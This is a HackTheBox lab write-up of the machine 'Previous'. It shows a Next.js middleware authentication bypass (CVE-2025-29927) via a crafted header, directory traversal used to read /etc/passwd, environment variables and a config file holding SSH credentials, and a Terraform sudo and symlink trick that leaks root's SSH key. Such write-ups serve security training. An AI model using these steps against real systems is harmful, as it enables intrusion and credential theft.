<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Previous</title>
<meta name=description content="Platform: HackTheBox Link: Previous Level: Medium OS: Linux Exploiting Previous begins with abusing CVE-2025-29927, a Next.js middleware authentication bypass, …"><meta name=keywords content="HackTheBox,Next.js,CVE-2025-29927,Terraform"><meta property="og:url" content="https://scorpiosec.com/posts/htb-previous/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Previous"><meta property="og:description" content="Platform: HackTheBox Link: Previous Level: Medium OS: Linux Exploiting Previous begins with abusing CVE-2025-29927, a Next.js middleware authentication bypass, …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Previous"><meta name=twitter:description content="Platform: HackTheBox Link: Previous Level: Medium OS: Linux Exploiting Previous begins with abusing CVE-2025-29927, a Next.js middleware authentication bypass, …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-previous/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-previous/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Previous/Previous.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-previous/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-previous/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Previous</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>February 11, 2026</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li><li class=post-tag><a href=https://scorpiosec.com/tags/next.js>Next.js</a></li><li class=post-tag><a href=https://scorpiosec.com/tags/cve-2025-29927>CVE-2025-29927</a></li><li class=post-tag><a href=https://scorpiosec.com/tags/terraform>Terraform</a></li></ul></div><div class=post-content><ul><li>Platform: HackTheBox</li><li>Link: <a href=https://app.hackthebox.com/machines/Previous>Previous</a></li><li>Level: Medium</li><li>OS: Linux</li></ul><hr><p>Exploiting Previous begins with abusing <code>CVE-2025-29927</code>, a Next.js middleware authentication bypass, to access a restricted functionality. This access is then leveraged to exploit a directory traversal vulnerability, allowing arbitrary file reads and the disclosure of sensitive application data, including SSH credentials. After gaining an initial foothold, privilege escalation is achieved by abusing a misconfigured Terraform execution as root, ultimately leading to the recovery of the root SSH key.</p><h1 id=scanning>Scanning</h1><pre tabindex=0><code>nmap -sC -sV -Pn -oA nmap/Previous {IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2026-01-17 04:46 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.129.242.162 <span style=color:#56b6c2>(</span>10.129.242.162<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.16s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://previous.htb/
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 27.48 seconds
</span></span></code></pre></div><p>Nmap finds two open ports running <code>SSH</code> (22) and <code>http</code> (80), there is also a redirection to <code>previous.htb</code> which we add to the <code>/etc/hosts</code> file.</p><pre tabindex=0><code>sudo echo &#34;{IP} previous.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h1 id=enumeration>Enumeration</h1><p>We access the website at <code>http://previous.htb/</code>. It features a Javascript framework named <code>PreviousJS</code>.</p><p><img src=/images/HTB-Previous/Previous_website.png alt="Previous website"></p><p>When we click on either <code>Get Started</code> and <code>Docs</code> we find a login page which we do not have any credentials for.</p><p><img src=/images/HTB-Previous/login.png alt="Previous login page"></p><p>Using Wappalyzer we see that the application is using NextJS version <code>15.2.2</code>.</p><p><img src=/images/HTB-Previous/nextjs.png alt="Wappalyzer Previous"></p><p>After checking the requests with Burp we see many going through the <code>_next</code> directory. A quick google search tells us that it is an internal folder used to load the application&rsquo;s Javascript and page data.</p><p><img src=/images/HTB-Previous/next_reqs.png alt="Previous burp requests"></p><p>Capturing a login request reveals that the application is using <code>NextAuth</code> which is an authentication library. It provides Cross-Site Request Forgery (CSRF) protection on all authentication routes.</p><blockquote><p>The application is using <a href=https://next-auth.js.org/>NextAuth.js</a> which is an open source authentication package for <code>Next.js</code>.</p></blockquote><p><img src=/images/HTB-Previous/NextAuth.png alt="Previous NextAuth"></p><p>Directory bruteforcing does not yield anything new.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://previous.htb
</code></pre><p><img src=/images/HTB-Previous/gobuster_previous.png alt="Previous gobuster"></p><p>While looking for known vulnerabilities affecting this version of Next.js, we identified <a href=https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass>CVE-2025-29927</a>, a middleware-based authentication bypass. Next.js applications commonly protect routes using middleware, which allows developers to run logic before a request reaches a page or API route. Internally, Next.js uses the <code>x-middleware-subrequest</code> header to track middleware execution during internal subrequests. This header is intended solely for internal framework communication and should not be trusted when supplied by external clients.</p><p>In vulnerable versions:</p><ul><li>The app trusts the header even when it comes from the user</li><li>If the header is present, the middleware logic could be skipped</li><li>The result is the ability to access protected pages without logging in.</li></ul><p>The normal process is:</p><pre tabindex=0><code>Request --&gt; Middleware (auth check) --&gt; Protected page 
</code></pre><p>By using the malicious header:</p><pre tabindex=0><code>Request + x-middleware-subrequest
1. Middleware thinks it has already been ran
2. Auth check is skipped
3. Protected page is served
</code></pre><p>Let&rsquo;s try to exploit this vulnerability in the login page. The article tells us to use the following payload.</p><pre tabindex=0><code>x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
</code></pre><blockquote><p>When the header list contains the middleware&rsquo;s name, the framework thinks it is dealing with an internal subrequest, and it does not enforce the authentication checks.
We repeat <code>middleware</code> because later versions of Next.js have a recursion counter in order to prevent infinite loops. Internally the framework only skips middleware if the number of occurences of the middleware name in <code>x-middleware-subrequest</code> is at or above the max recursion depth (5).</p></blockquote><p>We capture the request we get after clicking on <code>Docs</code> and add the payload to it.</p><p><img src=/images/HTB-Previous/bypass_payload.png alt="Previous auth bypass"></p><p>Inserting the payload manually in every request is tedious so we add a rule in Burp&rsquo;s proxy settings to solve this issue.</p><p>We go to <code>Proxy settings</code> &ndash;> <code>Proxy</code> &ndash;> under <code>HTTP match and replace rules</code> &ndash;> click on <code>Add</code> &ndash;> Add the header &ndash;> <code>OK</code>.</p><blockquote><p>When leaving the <code>Match</code> section blank , Burp appends the custom header to all the requests.</p></blockquote><p><img src=/images/HTB-Previous/burp_custom_header.png alt="Burp custom header"></p><p>As the picture below shows, Burp automatically adds our custom header to all the requests.</p><p><img src=/images/HTB-Previous/customreq_header_previous.png alt="Previous auth bypass"></p><p>Now we automatically bypass the login feature just by clicking on either of the buttons at <code>http://previous.htb/</code>.</p><p><img src=/images/HTB-Previous/previous_logged_in.png alt="Previous logged in"></p><p>The <code>Examples</code> section leads to a page with a download feature.</p><p><img src=/images/HTB-Previous/previous_examples.png alt="Previous examples section"></p><p>The download request shows a file being requested.</p><p><img src=/images/HTB-Previous/previous_download.png alt="Previous download request"></p><p>We test it for directory traversal and notice that we can read the <code>/etc/passwd</code> file.</p><p><img src=/images/HTB-Previous/dir_trav_previous.png alt="Previous directory traversal"></p><h1 id=initial-foothold>Initial Foothold</h1><p>We see two users: <code>node</code> and <code>nextjs</code>. Next we read the <code>/proc/self/environ</code> file.</p><blockquote><p><code>/proc/self/environ</code> contains the environment variables of the currently running web application process. It often includes secrets such as credentials, API keys, etc&mldr;</p></blockquote><p><img src=/images/HTB-Previous/proc_self_env.png alt="Previous LFI abuse"></p><p>From the output we can derive a few things:</p><ul><li>The backend of the application is running Node 18.</li><li>The application lives in <code>/app</code>.</li></ul><p>Several common configuration files are typically present in the root of a Next.js project:</p><ul><li><code>package.json</code>, which defines dependencies and npm scripts.</li><li><code>next.config.js</code>, which contains optional Next.js configuration settings.</li><li><code>.env</code> files (e.g., .env.local), which may be used to store environment variables and secrets.</li></ul><p>We read <code>package.json</code> and see <code>NextAuth</code> being mentionned once more, this time we have its version.</p><pre tabindex=0><code>../../../app/package.json
</code></pre><p><img src=/images/HTB-Previous/previous_pckg_json.png alt="Previous package.json"></p><p>Now we try to read<code>NextAuth.js</code> config file. <a href=https://next-auth.js.org/configuration/initialization>Here</a>, we learn that its location can be <code>/pages/api/auth/[...nextauth].js</code> or <code>/app/api/auth/[...nextauth]/route.js</code>.</p><pre tabindex=0><code>/pages/api/auth/[...nextauth].js
/app/api/auth/[...nextauth]/route.js
</code></pre><p>After trying both options we get a <code>File not found</code> error meaning that the file location we provided is not correct. This is different from a lack of read permission.</p><p><img src=/images/HTB-Previous/nextauth_404.png alt="Previous nextauth 404"></p><p>As an example let&rsquo;s try to read <code>root/root.txt</code>. We know this file exists because this is a HackTheBox machine. We get a <code>Read error</code> error meaning the file does exists but we do not have the permission to read it.</p><p><img src=/images/HTB-Previous/read_err_previous.png alt="Previous read error"></p><p>We could continue to guess the file specific location but it would be time costly. Instead we can build a sample project from the <code>package.son</code> file and observe its structure.</p><p>Below is the structure of my project.</p><p><img src=/images/HTB-Previous/nextjs_sample.png alt="Previous sample app"></p><p>Inside <code>nextjsapp</code> I ran:</p><pre tabindex=0><code>npm install

npm run build
</code></pre><p>After listing the content of <code>nextjsapp</code> we see a <code>.next</code> directory. This directory is automatically generated and is used for both development and production. It contains everything needed to run the application. So sensitive files are surely there.</p><p><img src=/images/HTB-Previous/next_dir.png alt="next directory"></p><p>After getting a good overview of the project structure, it is easy now to see why <code>/pages/api/auth/[...nextauth].js</code> was not working. <code>/pages/api/auth/[...nextauth].js</code> is under <code>/app/.next/server</code>.</p><p><img src=/images/HTB-Previous/next_tree.png alt="next directory tree"></p><p>The correct location is</p><pre tabindex=0><code>../../../app/.next/server/pages/api/auth/[...nextauth].js
</code></pre><blockquote><p>We already knew that the path for the file included <code>/pages/api/auth/[...nextauth].js</code> but it was not complete hence why we were getting <code>File not found</code>. Once we found the directories preceding <code>/pages</code> the entire path was now clear.</p></blockquote><blockquote><p>EDIT: ChatGPT gives a list of possible locations for <code>[...nextauth].js</code> including the valid one working here (even though I can&rsquo;t vouch for the output consistency I should have though about it earlier).</p></blockquote><p><img src=/images/HTB-Previous/nextauth_creds.png alt="next auth"></p><p>The request&rsquo;s response includes some minified javascript, we throw it in a <a href=https://beautifier.io/>beautifier</a> to make it more readable. It contains some credentials.</p><p><img src=/images/HTB-Previous/jere_creds.png alt="jeremy credentials"></p><pre tabindex=0><code>jeremy:MyNameIsJeremyAndILovePancakes
</code></pre><p>We use them and login via SSH.</p><h1 id=privilege-escalation>Privilege Escalation</h1><p>Running <code>sudo -l</code> we observe that <code>jeremy</code> can execute <code>terraform apply</code> as root in <code>/opt/examples</code>. Moreover, <code>!env_reset</code> indicates that environment variables will not be reset automatically when running sudo.</p><blockquote><p><code>env_reset</code> is enabled by default, so that when a command is run with <code>sudo</code> most environment variables are wiped or sanitized. This is done to prevent tricks such as <code>LD_PRELOAD</code>, <code>PATH</code> hijacking, plugin manipulation, etc.</p></blockquote><p><img src=/images/HTB-Previous/sudo_l.png alt=sudo-l_cmd></p><p>In <code>/opt/examples/main.tf</code> the <code>source_path</code> variable is defined with <code>default = "/root/examples/hello-world.ts"</code>. It means that if the user does not provide a value for that variable, Terraform will automatically use the default one. Additionally any file path provided must include <code>/root/examples</code>.</p><p>Terraform is configured to use a custom provider <code>previous.htb/terraform/examples</code>.</p><blockquote><p>A provider is a plugin to help Terraform interact with some external system.</p></blockquote><p><img src=/images/HTB-Previous/tf_provider.png alt="Terraform provider"></p><p>We can override the <code>default</code> value for <code>source_path</code> by setting our own file path. Since the environment variables will not be reset, any changes we make will persist.</p><p><img src=/images/HTB-Previous/examples_previous.png alt="sample versions"></p><p>Let&rsquo;s execute the script</p><pre tabindex=0><code>sudo /usr/bin/terraform -chdir\=/opt/examples apply
</code></pre><p><img src=/images/HTB-Previous/tf_apply.png alt="Terraform script"></p><p>Essentially <code>/root/examples/hello-world.ts</code> is being copied to <code>/home/jeremy/docker/previous/public/examples/hello-world.ts</code>.</p><p><a href=https://developer.hashicorp.com/terraform/cli/config/environment-variables>On this website</a> we are shown various ways to set variables for Terraform. We can use <code>TF_VAR_name</code> to set variables. We now have everything to exploit the target.</p><p>Even though there is a file path restriction, it is purely string-based. The script only checks if the file path provided contains <code>/root/examples</code>. It also does not prevent the use of symlinks.</p><ol><li>Create a fake allowed directory tree.</li></ol><pre tabindex=0><code>mkdir -p /tmp/root/examples
</code></pre><ol start=2><li>Create a symlink pointing to the root private key.</li></ol><pre tabindex=0><code>ln -sf /root/.ssh/id_rsa /tmp/root/examples
</code></pre><ol start=3><li>Override the default value of the <code>source_path</code> variable. Terraform executes as root and passes our controlled file to the provider.</li></ol><pre tabindex=0><code>TF_VAR_source_path=/tmp/root/examples/id_rsa sudo terraform -chdir\=/opt/examples apply
</code></pre><p>Enter <code>yes</code> when prompted to <code>Enter a value</code>.</p><p><img src=/images/HTB-Previous/tf_id_rsa.png alt="Terraform script run"></p><ol start=4><li>The provider copies the referenced file into the <code>examples</code> directory accessible to <code>jeremy</code> which allows the disclosure of <code>root</code> SSH key.</li></ol><pre tabindex=0><code>cat /home/jeremy/docker/previous/public/examples/id_rsa
</code></pre><p><img src=/images/HTB-Previous/root_SSH_key.png alt="Root SSH key"></p><p>We login as root and read <code>root.txt</code>.</p><pre tabindex=0><code>ssh -i id_rsa root@previous.htb
</code></pre><p><img src=/images/HTB-Previous/previous_root_flag.png alt="Previous root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/forced-hiatus/>&#8592;
Previous:
A Forced Hiatus, a Quiet Faith, and the Resolve to Continue</a></p><p class=prev-post-date>December 31, 2025</p></div><div class=next-post><p><a href=/posts/htb-soulmate/>Next:
HTB: Soulmate
&#8594;</a></p><p class=next-post-date>February 14, 2026</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2026 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>